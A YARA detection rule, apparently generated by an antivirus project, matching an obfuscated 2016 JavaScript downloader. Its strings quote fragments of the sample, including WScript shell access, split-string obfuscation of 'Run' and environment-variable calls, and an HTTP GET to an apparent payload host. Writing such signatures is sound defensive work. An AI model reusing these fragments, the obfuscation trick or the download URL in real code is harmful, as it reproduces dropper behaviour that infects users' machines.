rule sig_20160428_83bb36e380071e221fa8f272fff94cdb {
  meta:
    description = "datamaliciousorder - file 20160428_83bb36e380071e221fa8f272fff94cdb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "53d2bc8cd18d4aa735a435620956bfcc2ad071ba3ef8e43013ea594576210060"

  strings:
    $s1  = "function PhvBcbJrmCqaQlvYqdTdn(SioYqdJzdXlpEzqYlhVax){BhjYeyEyfCeoSwyClpHyl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function PhvBcbJrmCqaQlvYqdTdn(SioYqdJzdXlpEzqYlhVax){BhjYeyEyfCeoSwyClpHyl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "var BhjYeyEyfCeoSwyClpHyl = function PckVgzKigVjwBalWjsKdv() {return RigWulIstSlvHalXveGkh[JnzFhcGuaMbtJsuDxvVru](\"WScript\"+\"" ascii
    $s4  = "var BhjYeyEyfCeoSwyClpHyl = function PckVgzKigVjwBalWjsKdv() {return RigWulIstSlvHalXveGkh[JnzFhcGuaMbtJsuDxvVru](\"WScript\"+\"" ascii
    $s5  = "XuwJhzVphRllLbpGmpPrs[UazVgtPchRepFauJqtFgh](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s6  = "var RigWulIstSlvHalXveGkh = this[\"WScript\"];" fullword ascii
    $s7  = "function SrnHonRymVbpSwgCahRkm() {return BhjYeyEyfCeoSwyClpHyl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "function QfyXzePtvVqdMkqDxjJyx(RhiExtWjgCvcVotFqbXav, KjoPpsFcaBfuBfsLzgMmr){RtvTmjWefEciXvlKjaAjq = RtvTmjWefEciXvlKjaAjq * 1; " ascii
    $s9  = "function GqhPywVwlZoiHzqCboKpw(){return KjpMrkVuiJtyUwbUrkSem + \"\";};" fullword ascii
    $s10 = "return RhiExtWjgCvcVotFqbXav - KjoPpsFcaBfuBfsLzgMmr;};" fullword ascii
    $s11 = "if (XuwJhzVphRllLbpGmpPrs[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function ZqfDntPeoHckXnwCxmXov() {return ((QmyFgcKryGmhTkyRtfWhh == true) && (QmyFgcKryGmhTkyRtfWhh == KejOsgYwpLbqSlxNgoMhx)) ?" ascii
    $s13 = "function ZqfDntPeoHckXnwCxmXov() {return ((QmyFgcKryGmhTkyRtfWhh == true) && (QmyFgcKryGmhTkyRtfWhh == KejOsgYwpLbqSlxNgoMhx)) ?" ascii
    $s14 = "function SrnHonRymVbpSwgCahRkm() {return BhjYeyEyfCeoSwyClpHyl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s15 = "function HfzRjtHffKrqCntAruVnh(){return 23;};" fullword ascii
    $s16 = "function QfyXzePtvVqdMkqDxjJyx(RhiExtWjgCvcVotFqbXav, KjoPpsFcaBfuBfsLzgMmr){RtvTmjWefEciXvlKjaAjq = RtvTmjWefEciXvlKjaAjq * 1; " ascii
    $s17 = "function ThkLbiMpaWpzUptHsyIbi()" fullword ascii
    $s18 = "WmkGmvLhxTdeZbaHjzYrb = true;" fullword ascii
    $s19 = "function DsyVgzIndJnhTyqXviCyz(MohQqpGeqWigEwwZdiWex) {var UmrBntDtgHjqKcwYdvBgd = (1, 2, 3, 4, 5, MohQqpGeqWigEwwZdiWex); retur" ascii
    $s20 = "KejOsgYwpLbqSlxNgoMhx = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}